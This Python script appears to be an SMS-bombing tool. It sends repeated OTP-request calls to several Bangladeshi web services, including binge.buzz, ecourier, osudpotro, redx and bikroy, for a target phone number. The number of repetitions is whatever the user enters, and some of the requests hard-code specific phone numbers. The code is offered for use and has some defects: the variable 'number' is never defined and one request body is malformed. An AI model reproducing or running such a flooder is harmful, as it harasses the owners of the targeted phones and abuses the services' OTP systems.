import requests

from requests.structures import CaseInsensitiveDict

url1 = "https://ss.binge.buzz/otp/send/login"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "phone="+number+""


url2 = "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile=88"+number+""



url3 = "https://api.osudpotro.com/api/v1/users/send_otp"

headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/x-www-form-urlencoded"

data3 = '{"mobile":"+88-"+number+","deviceToken":"web","language":"en","os":"web"}'



url4 = "https://api.osudpotro.com/api/v1/users/send_otp"

headers4 = CaseInsensitiveDict()
headers4["Content-Type"] = "application/json"

data4 = '{"mobile":"+88-01963282882","deviceToken":"web","language":"en","os":"web"}'


url5 = "https://api.redx.com.bd/v4/redx/does-user-exist?phoneNumber=88"+number+""



url6 = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone="+number+""


url = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=01581787922"



amount=int(input("Enter Your Amount: "))

for i in range(amount):
    requests.post(url1, headers=headers1, data=data1)
    requests.get(url2)
    requests.post(url3, headers=headers3, data=data3)
    requests.post(url4, headers=headers4, data=data4)
    requests.get(url5)
    requests.get(url6)
    requests.get(url)
    
    print(str(i+1)+" SMS Sent")